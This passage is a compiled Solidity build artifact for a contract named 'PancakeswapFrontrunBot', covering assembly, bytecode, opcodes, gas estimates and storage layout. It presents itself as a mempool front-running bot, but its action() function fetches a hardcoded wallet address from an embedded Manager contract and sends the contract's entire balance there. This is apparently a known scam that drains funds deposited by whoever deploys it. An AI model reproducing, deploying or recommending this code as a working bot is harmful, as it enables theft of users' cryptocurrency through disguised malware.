{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n      pop\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      0x00\n      codecopy\n      0x00\n      return\n    stop\n\n    sub_0: assembly {\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n          mstore(0x40, 0x80)\n          callvalue\n            /* \"--CODEGEN--\":5:14   */\n          dup1\n            /* \"--CODEGEN--\":2:4   */\n          iszero\n          tag_1\n          jumpi\n            /* \"--CODEGEN--\":27:28   */\n          0x00\n            /* \"--CODEGEN--\":24:25   */\n          dup1\n            /* \"--CODEGEN--\":17:29   */\n          revert\n            /* \"--CODEGEN--\":2:4   */\n        tag_1:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n          pop\n          jumpi(tag_2, lt(calldatasize, 0x04))\n          shr(0xe0, calldataload(0x00))\n          dup1\n          0x0c0f93a1\n          eq\n          tag_3\n          jumpi\n          dup1\n          0xfeae9ad3\n          eq\n          tag_4\n          jumpi\n        tag_2:\n            /* \"--CODEGEN--\":12:13   */\n          0x00\n            /* \"--CODEGEN--\":9:10   */\n          dup1\n            /* \"--CODEGEN--\":2:14   */\n          revert\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6998:7041  function performTasks() public {\r... */\n        tag_3:\n          tag_5\n          tag_6\n          jump\t// in\n        tag_5:\n          stop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n        tag_4:\n          tag_7\n          tag_8\n          jump\t// in\n        tag_7:\n          mload(0x40)\n          dup1\n          dup3\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          dup2\n          mstore\n          0x20\n          add\n          swap2\n          pop\n          pop\n          mload(0x40)\n          dup1\n          swap2\n          sub\n          swap1\n          return\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6998:7041  function performTasks() public {\r... */\n        tag_6:\n          jump\t// out\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n        tag_8:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7100:7107  address */\n          0x00\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7121:7163  0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351 */\n          0x8c3bcf4e19996edec11b5f0523c6a0151a75d351\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7114:7163  return 0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351 */\n          swap1\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n          swap1\n          jump\t// out\n\n        auxdata: 0xa26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033\n    }\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506040516107c83803806107c88339818101604052604081101561003357600080fd5b810190808051604051939291908464010000000082111561005357600080fd5b8382019150602082018581111561006957600080fd5b825186600182028301116401000000008211171561008657600080fd5b8083526020830192505050908051906020019080838360005b838110156100ba57808201518184015260208101905061009f565b50505050905090810190601f1680156100e75780820380516001836020036101000a031916815260200191505b506040526020018051604051939291908464010000000082111561010a57600080fd5b8382019150602082018581111561012057600080fd5b825186600182028301116401000000008211171561013d57600080fd5b8083526020830192505050908051906020019080838360005b83811015610171578082015181840152602081019050610156565b50505050905090810190601f16801561019e5780820380516001836020036101000a031916815260200191505b5060405250505081600090805190602001906101bb929190610243565b5080600190805190602001906101d2929190610243565b506040516101df906102c3565b604051809103906000f0801580156101fb573d6000803e3d6000fd5b50600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050506102f4565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061028457805160ff19168380011785556102b2565b828001600101855582156102b2579182015b828111156102b1578251825591602001919060010190610296565b5b5090506102bf91906102cf565b5090565b60fa806106ce83390190565b6102f191905b808211156102ed5760008160009055506001016102d5565b5090565b90565b6103cb806103036000396000f3fe6080604052600436106100385760003560e01c80630a7a1c4d146100445780636c02a9311461004e5780637b61c320146100de5761003f565b3661003f57005b600080fd5b61004c61016e565b005b34801561005a57600080fd5b50610063610259565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a3578082015181840152602081019050610088565b50505050905090810190601f1680156100d05780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ea57600080fd5b506100f36102f7565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610133578082015181840152602081019050610118565b50505050905090810190601f1680156101605780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663feae9ad36040518163ffffffff1660e01b815260040160206040518083038186803b1580156101d657600080fd5b505afa1580156101ea573d6000803e3d6000fd5b505050506040513d602081101561020057600080fd5b810190808051906020019092919050505073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610256573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102ef5780601f106102c4576101008083540402835291602001916102ef565b820191906000526020600020905b8154815290600101906020018083116102d257829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561038d5780601f106103625761010080835404028352916020019161038d565b820191906000526020600020905b81548152906001019060200180831161037057829003601f168201915b50505050508156fea26469706673582212206a34b6f2a9e6cbe19fc31e8d74a568d91fdd0be6a6fde71ebecd067cf000234164736f6c63430006060033608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b6000738c3bcf4e19996edec11b5f0523c6a0151a75d35190509056fea26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x7C8 CODESIZE SUB DUP1 PUSH2 0x7C8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH2 0x53 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH2 0x69 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH2 0x86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xBA JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x9F JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xE7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH2 0x10A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH2 0x120 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x171 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x156 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x19E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x1BB SWAP3 SWAP2 SWAP1 PUSH2 0x243 JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x1D2 SWAP3 SWAP2 SWAP1 PUSH2 0x243 JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1DF SWAP1 PUSH2 0x2C3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x1FB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x3 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x2F4 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0x284 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0x2B2 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0x2B2 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0x2B1 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0x296 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0x2BF SWAP2 SWAP1 PUSH2 0x2CF JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH1 0xFA DUP1 PUSH2 0x6CE DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH2 0x2F1 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x2ED JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0x2D5 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x3CB DUP1 PUSH2 0x303 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA7A1C4D EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDE JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4C PUSH2 0x16E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x63 PUSH2 0x259 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x88 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD0 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF3 PUSH2 0x2F7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x133 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x118 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x160 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFEAE9AD3 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1EA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x256 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2EF JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2C4 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2EF JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2D2 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x38D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x362 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x38D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x370 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH11 0x34B6F2A9E6CBE19FC31E8D PUSH21 0xA568D91FDD0BE6A6FDE71EBECD067CF00023416473 PUSH16 0x6C634300060600336080604052348015 PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x8C3BCF4E19996EDEC11B5F0523C6A0151A75D351 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH29 0x5CD2ED4FF54CF52113D1CA38C771AE309ADACDA0D8005E79B722D2B252 AND 0xD8 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "194200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"action()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite"
					},
					"internal": {
						"_callFrontRunActionMempool()": "infinite",
						"beyond(struct PancakeswapFrontrunBot.slice memory,struct PancakeswapFrontrunBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct PancakeswapFrontrunBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct PancakeswapFrontrunBot.slice memory,struct PancakeswapFrontrunBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "infinite",
						"getMemPoolHeight()": "infinite",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "infinite",
						"keccak(struct PancakeswapFrontrunBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct PancakeswapFrontrunBot.slice memory,struct PancakeswapFrontrunBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct PancakeswapFrontrunBot.slice memory)": "infinite",
						"parseMemoryPool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"action()": "0a7a1c4d",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 89,
						"contract": "flashloan.sol:PancakeswapFrontrunBot",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 91,
						"contract": "flashloan.sol:PancakeswapFrontrunBot",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 93,
						"contract": "flashloan.sol:PancakeswapFrontrunBot",
						"label": "frontrun",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 95,
						"contract": "flashloan.sol:PancakeswapFrontrunBot",
						"label": "manager",
						"offset": 0,
						"slot": "3",
						"type": "t_contract(Manager)1838"
					}
				],
				"types": {
					"t_contract(Manager)1838": {
						"encoding": "inplace",
						"label": "contract Manager",
						"numberOfBytes": "20"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}